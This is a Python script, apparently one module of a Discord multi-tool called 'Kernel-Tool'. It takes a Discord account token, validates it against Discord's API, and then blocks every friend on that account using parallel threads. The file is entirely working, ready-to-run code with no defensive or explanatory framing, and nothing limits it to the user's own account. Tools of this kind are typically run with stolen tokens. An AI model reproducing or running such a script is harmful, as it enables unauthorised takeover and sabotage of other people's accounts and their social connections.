# Copyright (c) Kernel-Tool
# See the file 'LICENSE' for copying permission
# ------------------------------------------------------------------------------------------------
# EN:
#     - Do not touch or modify the code below. If there is an error, please contact the owner,
#       but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR:
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le
#       propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
# ------------------------------------------------------------------------------------------------

from Config.Util import *
from Config.Config import *

try:
    import requests
    import threading
except Exception as e:
    ErrorModule(e)

Title("Token Block Friends")

try:
    Reset()
    print(token_block_friends_banner)

    discord_token = Choice1TokenDiscord()
    token_check = requests.get(
        'https://discord.com/api/v8/users/@me',
        headers={'Authorization': discord_token, 'Content-Type': 'application/json'}
    )

    if token_check.status_code == 200:
        pass
    else:
        ErrorToken()

    def block_friends(discord_token, friends_list):
        for friend in friends_list:
            try:
                requests.put(
                    f'https://discord.com/api/v9/users/@me/relationships/' + friend['id'],
                    headers={'Authorization': discord_token},
                    json={"type": 2}
                )
                print(f"{LC}{BEFORE + AFTER} {ADD} Status: Blocked | User: {friend['user']['username']}#{friend['user']['discriminator']}{RS}")
            except Exception as e:
                print(f"{LC}{BEFORE + AFTER} {ERROR} Status: Error: {e}{RS}")

    friends_data = requests.get(
        "https://discord.com/api/v9/users/@me/relationships",
        headers={'Authorization': discord_token}
    ).json()

    if not friends_data:
        print(f"{LC}{BEFORE + AFTER} {INFO} No friends found.{RS}")
        Continue()
        Reset()

    thread_list = []
    for friend_batch in [friends_data[i:i+3] for i in range(0, len(friends_data), 3)]:
        thread = threading.Thread(target=block_friends, args=(discord_token, friend_batch))
        thread.start()
        thread_list.append(thread)

    for thread in thread_list:
        thread.join()

    Continue()
    Reset()

except Exception as e:
    Error(e)
